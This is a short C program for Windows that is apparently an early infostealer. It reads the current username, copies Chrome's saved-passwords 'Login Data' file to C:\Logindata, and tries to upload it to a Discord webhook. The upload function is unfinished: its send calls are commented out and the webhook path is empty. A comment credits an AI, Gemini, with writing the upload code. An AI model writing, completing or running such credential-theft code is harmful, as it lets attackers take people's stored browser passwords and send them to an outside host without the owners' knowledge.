#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include <winhttp.h>
#include <wchar.h>



#pragma comment(lib, "winhttp.lib")

//written by gemini because I was too lazy to MANUALLY FORMAT THE DISCORD WEBHOOK MULTIPART FORM DATA AND REQUEST LIKE WHAT THE HECK

void SendDiscordFile(const wchar_t* host, const wchar_t* path, const char* filename, const char* filePath) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwSize = 0, dwDownloaded = 0;
    BOOL bResults = FALSE;

    // 1. Initialize WinHTTP
    hSession = WinHttpOpen(L"DiscordWebhook/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    // 2. Connect to discord.com
    hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) goto cleanup;

    // 3. Open request
    hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) goto cleanup;

    // 4. Read file content
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    ReadFile(hFile, fileBuffer, fileSize, &dwSize, NULL);
    CloseHandle(hFile);

    // 5. Construct Multipart Body
    char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    char contentTypeHeader[100];
    sprintf_s(contentTypeHeader, sizeof(contentTypeHeader), "Content-Type: multipart/form-data; boundary=%s", boundary);

    // Prepare body parts (simplified)
    char* bodyStart = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                      "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n"
                      "{\"content\": \"File upload test\"}\r\n"
                      "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
                      "Content-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n"
                      "Content-Type: application/octet-stream\r\n\r\n";
    // (Actual implementation requires calculating total length, 
    // appending file data, and appending boundary end)

    // Send request (simplified - requires complex buffer management)
    // bResults = WinHttpSendRequest(hRequest, contentTypeHeader, -1, ..., ..., ..., NULL);
    // WinHttpWriteData(hRequest, ..., ..., ...);

    free(fileBuffer);
cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}






//wirtten by me because I'm better 
//main function, grabs the username and copies the Chrome login data file to C:\Logindata, then would send it to the webhook
int main(void){

    char username [UNLEN +1];
    DWORD username_len = UNLEN +1;


    if(GetUserNameA(username, &username_len)) {
        printf("Username: %s\n", username);
    } else {
        printf("Could not get username.\n");
    }



    char password_path[256];
    sprintf_s(password_path, sizeof(password_path), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", username);

    printf("Password Path: %s\n", password_path);
    LPCSTR password_path_pointer = &password_path[0];



    if(CopyFileA(password_path_pointer, "C:\\Logindata", FALSE)) {
        printf("File copied successfully.\n");
    } else {
        printf("File copy failed: %lu\n", GetLastError());
    }

    SendDiscordFile(L"discord.com", L"", "Logindata", "C:\\Logindata");

    

    


    return 0; 



}

